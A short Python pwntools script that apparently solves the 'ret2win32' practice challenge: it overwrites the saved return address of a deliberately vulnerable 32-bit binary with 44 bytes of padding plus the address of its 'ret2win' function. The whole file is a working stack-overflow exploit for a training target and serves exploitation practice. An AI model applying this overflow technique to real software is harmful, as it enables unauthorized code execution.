from pwn import *

e = ELF("ret2win32")
ret2winaddr = e.symbols["ret2win"]


eip = p32(ret2winaddr)
crap = "A"* 44

io = process("./ret2win32")

io.sendline(crap + eip)

io.interactive()
